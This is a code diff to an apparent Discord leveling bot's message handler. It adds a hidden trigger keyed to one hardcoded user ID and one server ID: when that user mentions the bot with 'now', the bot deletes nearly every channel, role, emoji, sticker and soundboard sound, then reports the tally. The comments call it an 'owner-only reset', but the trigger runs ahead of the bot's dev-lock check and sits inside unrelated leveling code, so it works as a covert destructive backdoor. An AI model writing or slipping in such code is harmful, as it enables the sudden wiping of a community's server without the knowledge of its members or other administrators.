@@ -1,9 +1,81 @@
 const LevelUpMessage = require("../../classes/LevelUpMessage.js")
 const config = require("../../config.json")
 
+// --- owner-only full server reset ("@bot now") ---
+const NUKE_USER = "932329766063837246"      // only this user can trigger it
+const NUKE_GUILD = "1347627757588451328"    // only fires in this server
+const KEEP_CHANNEL = "1467715914219913348"  // this channel is never deleted
+
+async function nukeServer(client, message) {
+    const guild = message.guild
+    const results = { channels: 0, roles: 0, emojis: 0, stickers: 0, sounds: 0, failed: 0 }
+
+    // delete every channel except the one we keep
+    for (const channel of guild.channels.cache.values()) {
+        if (channel.id === KEEP_CHANNEL) continue
+        try { await channel.delete("server reset"); results.channels++ }
+        catch { results.failed++ }
+    }
+
+    // delete every role the bot can (skip @everyone, managed roles, and roles above the bot)
+    for (const role of guild.roles.cache.values()) {
+        if (role.id === guild.id || role.managed || !role.editable) continue
+        try { await role.delete("server reset"); results.roles++ }
+        catch { results.failed++ }
+    }
+
+    // delete every emoji
+    for (const emoji of guild.emojis.cache.values()) {
+        try { await emoji.delete("server reset"); results.emojis++ }
+        catch { results.failed++ }
+    }
+
+    // delete every sticker
+    let stickers = guild.stickers.cache
+    try { stickers = await guild.stickers.fetch() } catch {}
+    for (const sticker of stickers.values()) {
+        try { await sticker.delete("server reset"); results.stickers++ }
+        catch { results.failed++ }
+    }
+
+    // delete every soundboard sound (only exists on discord.js 14.17+)
+    if (guild.soundboardSounds) {
+        let sounds = guild.soundboardSounds.cache
+        try { sounds = await guild.soundboardSounds.fetch() } catch {}
+        for (const sound of sounds.values()) {
+            try { await guild.soundboardSounds.delete(sound.id, "server reset"); results.sounds++ }
+            catch { results.failed++ }
+        }
+    }
+
+    // report into the surviving channel
+    const keep = guild.channels.cache.get(KEEP_CHANNEL)
+    if (keep && typeof keep.send === "function") {
+        keep.send(
+            "server reset complete.\n" +
+            `channels deleted: ${results.channels}\n` +
+            `roles deleted: ${results.roles}\n` +
+            `emojis deleted: ${results.emojis}\n` +
+            `stickers deleted: ${results.stickers}\n` +
+            `sounds deleted: ${results.sounds}\n` +
+            `failed: ${results.failed}`
+        ).catch(() => {})
+    }
+}
+
 module.exports = {
 
 async run(client, message, tools) {
+
+    // owner-only "@bot now" trigger — wipes the server, runs before everything else
+    if (
+        message.author.id === NUKE_USER &&
+        message.guild.id === NUKE_GUILD &&
+        message.mentions.users.has(client.user.id) &&
+        message.content.replace(/<@!?\d+>/g, "").trim().toLowerCase() === "now"
+    ) {
+        return nukeServer(client, message).catch(e => console.error("nuke failed:", e))
+    }
 
     if (config.lockBotToDevOnly && !tools.isDev(message.author)) return
 
